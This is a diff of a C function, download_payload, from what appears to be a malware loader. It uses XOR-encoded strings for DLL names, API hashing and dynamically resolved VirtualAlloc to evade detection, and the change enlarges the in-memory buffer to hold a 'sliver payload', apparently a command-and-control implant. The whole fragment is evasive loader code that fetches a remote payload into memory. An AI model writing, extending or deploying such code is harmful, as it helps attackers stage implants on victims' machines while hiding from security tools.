@@ -18,8 +18,7 @@ char* download_payload(const char* url, SIZE_T* payload_size) {
     char enc_wininet[] = { 0x28, 0x1a, 0x1b, 0x19, 0x5d, 0x16, 0x47, 0x4d, 0x16, 0x5f, 0x18, 0x6b };
     char enc_kernel32[] = { 0x34, 0x16, 0x07, 0x1e, 0x56, 0x1f, 0x00, 0x51, 0x5c, 0x57, 0x18, 0x07, 0x33 };
     
-    // --- new encoded string for User-Agent
-    // NOTE: encrypt "Mozilla/5.0" using string_encryptor.py!
+    // using "Mozilla/5.0" as user agent
     char enc_user_agent[] = { 0x12, 0x1c, 0x0f, 0x19, 0x5f, 0x1f, 0x52, 0x4c, 0x47, 0x1d, 0x44, 0x6b };
 
     // API hashes
@@ -81,7 +80,9 @@ char* download_payload(const char* url, SIZE_T* payload_size) {
     }
 
     // prepare memory buffer to hold payload (4 MB)
-    SIZE_T buffer_size = 4 * 1024 * 1024; 
+    // SIZE_T buffer_size = 4 * 1024 * 1024; 
+    // new memory buffer - sliver payload (36 MB)
+    SIZE_T buffer_size = 36 * 1024 * 1024;
     
     // use dynamically resolved VirtualAlloc
     char* payload_buffer = (char*) fnVirtualAlloc(NULL, buffer_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
